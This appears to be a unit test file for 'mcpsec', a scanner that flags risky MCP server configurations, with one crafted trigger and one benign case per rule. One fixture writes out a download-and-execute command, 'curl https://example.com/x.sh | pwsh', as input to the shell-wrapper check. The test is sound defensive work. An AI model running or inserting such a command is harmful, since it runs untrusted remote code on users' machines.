"""Tests for the mcpsec risk-rule engine.

Each rule is exercised twice: a crafted :class:`ServerDef` that should trip it
(asserting the expected rule id and severity), and a benign one that should
leave it silent. The individual rule functions are generators, so they are
materialised with ``list``.
"""

import unittest

from mcpsec.models import ServerDef
from mcpsec import rules


def _server(**kwargs) -> ServerDef:
    """Build a ServerDef with sensible required fields filled in."""
    kwargs.setdefault("name", "srv")
    kwargs.setdefault("source_file", "config.json")
    return ServerDef(**kwargs)


class IndividualRuleTest(unittest.TestCase):
    """Every rule fires on a crafted server and stays silent on a benign one."""

    def _fire(self, rule, server):
        return list(rule(server))

    def test_mcpsec001_inline_secret(self):
        fired = self._fire(
            rules.rule_inline_secret,
            _server(env={"OPENAI_API_KEY": "sk-abcdefghijklmnop"}),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC001"])
        self.assertEqual(fired[0].severity, "HIGH")
        # A non-secret env key/value is silent.
        self.assertEqual(
            self._fire(
                rules.rule_inline_secret, _server(env={"FS_ALLOW_WRITE": "false"})
            ),
            [],
        )

    def test_mcpsec002_auth_header(self):
        fired = self._fire(
            rules.rule_auth_header,
            _server(url="https://x", headers={"Authorization": "Bearer abc"}),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC002"])
        self.assertEqual(fired[0].severity, "MEDIUM")
        self.assertEqual(
            self._fire(
                rules.rule_auth_header,
                _server(url="https://x", headers={"X-Client-Id": "abc"}),
            ),
            [],
        )

    def test_mcpsec003_unpinned_npx(self):
        fired = self._fire(
            rules.rule_unpinned_npx,
            _server(command="npx", args=["-y", "some-package"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC003"])
        self.assertEqual(fired[0].severity, "MEDIUM")
        # A pinned version is silent.
        self.assertEqual(
            self._fire(
                rules.rule_unpinned_npx,
                _server(command="npx", args=["-y", "some-package@1.2.3"]),
            ),
            [],
        )

    def test_mcpsec004_npx_yes(self):
        fired = self._fire(
            rules.rule_npx_yes,
            _server(command="npx", args=["-y", "some-package@1.2.3"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC004"])
        self.assertEqual(fired[0].severity, "LOW")
        self.assertEqual(
            self._fire(
                rules.rule_npx_yes,
                _server(command="npx", args=["some-package@1.2.3"]),
            ),
            [],
        )

    def test_mcpsec004_runner_basename_normalized(self):
        # A Windows launcher (npx.cmd) still resolves to the npx runner.
        fired = self._fire(
            rules.rule_npx_yes,
            _server(command="npx.cmd", args=["-y", "some-package@1.2.3"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC004"])
        self.assertEqual(fired[0].severity, "LOW")

    def test_mcpsec003_pep508_exact_pin_not_flagged(self):
        # 'uvx ruff==0.6.9' is an exact PEP 508 pin and must not trip MCPSEC003.
        self.assertEqual(
            self._fire(
                rules.rule_unpinned_npx,
                _server(command="uvx", args=["ruff==0.6.9"]),
            ),
            [],
        )

    def test_mcpsec005_broad_fs_path(self):
        fired = self._fire(
            rules.rule_broad_fs_path,
            _server(command="npx", args=["server-filesystem", "/"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC005"])
        self.assertEqual(fired[0].severity, "HIGH")
        # A scoped subdirectory is silent.
        self.assertEqual(
            self._fire(
                rules.rule_broad_fs_path,
                _server(command="npx", args=["server-filesystem", "/srv/data"]),
            ),
            [],
        )

    def test_mcpsec006_shell_wrapper(self):
        fired = self._fire(
            rules.rule_shell_wrapper,
            _server(command="bash", args=["-c", "echo hi"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC006"])
        self.assertEqual(fired[0].severity, "HIGH")
        self.assertEqual(
            self._fire(
                rules.rule_shell_wrapper,
                _server(command="node", args=["app.js"]),
            ),
            [],
        )

    def test_mcpsec006_pipe_to_pwsh(self):
        # A command piped into pwsh (not just sh/bash/zsh) is caught.
        fired = self._fire(
            rules.rule_shell_wrapper,
            _server(command="node", args=["curl https://example.com/x.sh | pwsh"]),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC006"])
        self.assertEqual(fired[0].severity, "HIGH")

    def test_mcpsec007_insecure_remote_http(self):
        fired = self._fire(
            rules.rule_insecure_remote_http,
            _server(url="http://mcp.example.com/sse"),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC007"])
        self.assertEqual(fired[0].severity, "HIGH")
        self.assertEqual(
            self._fire(
                rules.rule_insecure_remote_http,
                _server(url="https://mcp.example.com/sse"),
            ),
            [],
        )

    def test_mcpsec008_remote_endpoint_review(self):
        fired = self._fire(
            rules.rule_remote_endpoint_review,
            _server(url="https://mcp.example.com/sse"),
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC008"])
        self.assertEqual(fired[0].severity, "INFO")
        # A local stdio server (no url) is silent.
        self.assertEqual(
            self._fire(
                rules.rule_remote_endpoint_review,
                _server(command="node", args=["app.js"]),
            ),
            [],
        )

    def test_mcpsec009_sampling_enabled(self):
        fired = self._fire(
            rules.rule_sampling_enabled, _server(sampling=True)
        )
        self.assertEqual([f.rule_id for f in fired], ["MCPSEC009"])
        self.assertEqual(fired[0].severity, "MEDIUM")
        self.assertEqual(
            self._fire(rules.rule_sampling_enabled, _server(sampling=None)), []
        )


class RunRulesTest(unittest.TestCase):
    """run_rules aggregates across servers and sorts by severity."""

    def test_aggregates_and_sorts_by_severity(self):
        servers = [
            _server(name="remote", url="http://insecure.example.com"),
            _server(name="local", sampling=True),
        ]
        findings = rules.run_rules(servers)
        rule_ids = {f.rule_id for f in findings}
        # http:// trips both MCPSEC007 (HIGH) and the catch-all is not relevant;
        # sampling trips MCPSEC009 (MEDIUM).
        self.assertIn("MCPSEC007", rule_ids)
        self.assertIn("MCPSEC009", rule_ids)
        # Sorted by severity: the HIGH finding precedes the MEDIUM one.
        severities = [f.severity for f in findings]
        self.assertEqual(severities, sorted(
            severities, key=lambda s: rules.SEVERITY_ORDER[s]
        ))


class RuleDescriptionsTest(unittest.TestCase):
    """rule_descriptions exposes a short text for every rule id."""

    def test_covers_all_rules(self):
        descriptions = rules.rule_descriptions()
        self.assertGreater(len(rules.RULE_METADATA), 0)
        for rule_id, _severity in rules.RULE_METADATA:
            self.assertIn(rule_id, descriptions)
            self.assertTrue(descriptions[rule_id])


if __name__ == "__main__":
    unittest.main()
